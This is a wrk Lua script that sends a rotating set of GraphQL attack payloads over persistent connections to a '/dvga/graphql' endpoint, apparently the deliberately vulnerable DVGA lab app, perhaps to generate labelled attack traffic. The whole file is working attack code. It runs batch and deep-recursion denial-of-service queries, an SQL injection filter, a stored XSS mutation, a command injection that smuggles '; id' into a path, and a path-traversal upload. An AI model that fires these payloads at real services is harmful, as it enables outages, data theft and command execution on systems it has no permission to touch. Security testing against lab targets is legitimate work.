-- wrk Lua: GraphQL torture payloads over persistent connections
-- Rotates through batch DoS, deep recursion, field duplication, SQLi, XSS mutations

local counter = 0
local marker = assert(os.getenv("TGEN_FAMILY_MARKER"), "family journal marker required")

local payloads = {
  -- Batch query DoS (5x systemUpdate)
  '[{"query":"{systemUpdate}"},{"query":"{systemUpdate}"},{"query":"{systemUpdate}"},{"query":"{systemUpdate}"},{"query":"{systemUpdate}"}]',
  -- Deep recursion (depth 7)
  '{"query":"{pastes{owner{pastes{owner{pastes{owner{pastes{title}}}}}}}}"}',
  -- Field duplication (20x)
  '{"query":"{pastes{title title title title title title title title title title title title title title title title title title title title}}"}',
  -- SQLi via filter
  '{"query":"{pastes(filter:\\"aaa\' OR 1=1--\\"){id title content}}"}',
  -- Normal paste listing
  '{"query":"{pastes{id title content}}"}',
  -- XSS createPaste
  '{"query":"mutation{createPaste(title:\\"<script>alert(1)</script>\\",content:\\"' .. marker .. ':torture\\",public:true){paste{id}}}"}',
  -- systemHealth
  '{"query":"{systemHealth}"}',
  -- Batch with mixed operations
  '[{"query":"{systemHealth}"},{"query":"{pastes{id title}}"},{"query":"{systemUpdate}"}]',
  -- importPaste command injection
  '{"query":"mutation{importPaste(host:\\"localhost\\",port:80,path:\\"/  ; id\\",scheme:\\"http\\"){result}}"}',
  -- uploadPaste path traversal
  '{"query":"mutation{uploadPaste(filename:\\"../../../tmp/' .. marker .. '-traversal.txt\\",content:\\"' .. marker .. ':traversal test\\"){result}}"}',
}

request = function()
  counter = counter + 1
  local payload = payloads[(counter % #payloads) + 1]

  wrk.headers["Content-Type"] = "application/json"
  wrk.headers["Connection"] = "keep-alive"

  return wrk.format("POST", "/dvga/graphql", nil, payload)
end
